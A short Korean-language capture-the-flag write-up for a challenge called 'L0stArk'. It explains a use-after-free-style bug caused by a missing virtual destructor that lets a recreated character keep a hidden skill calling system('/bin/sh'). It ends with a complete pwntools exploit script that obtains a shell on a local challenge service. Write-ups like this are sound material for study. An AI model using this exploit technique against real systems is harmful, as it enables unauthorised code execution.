# L0stArk

## 취약점
Character를 상속받은 클래스에 대해 인스턴스를 생성, 삭제 할 수 있고 스킬을 사용 할 수 있다.
캐릭터 생성시 7번을 선택하면 hidden character를 선택할 수 있다.
hidden character는 `system("/bin/sh")`을 실행하는 `skill`인 `gift`가 있지만, `skill`을 직접 사용 할 수 없다.

생성한 캐릭터를 삭제하는 부분에 취약점이 있다.
Character는 virtual Destructor가 없어서 `destroy()`의 `v.erase()`에서 캐릭터를 삭제할 때 `skill`을 nullify 해주는 destructor가 불리지 않는다.

따라서 hidden character를 생성하여 `skill` 자리가 `gift`인 청크를 만들어 준다.
생성한 hidden character를 삭제한 뒤 다른 캐릭터를 생성하면 `skill`이 그대로 `gift`로 유지된다.
`skill`을 사용하여 쉘을 획득한다.

## exploit
```python
from pwn import *

p = remote("localhost", 31678)

def create(no, name=None):
  p.sendlineafter("pick: ", "1")
  p.sendlineafter("pick: ", str(no))
  if name:
    p.sendlineafter("name: ", name)

def choose(no):
  p.sendlineafter("pick: ", "4")
  p.sendlineafter("pick: ", str(no))

def destroy(no):
  p.sendlineafter("pick: ", "2")
  p.sendlineafter("pick: ", "0")

def useskill():
  p.sendlineafter("pick: ", "6")


create(7)
destroy(0)
create(1, "A")
choose(0)
useskill()

p.interactive()
```
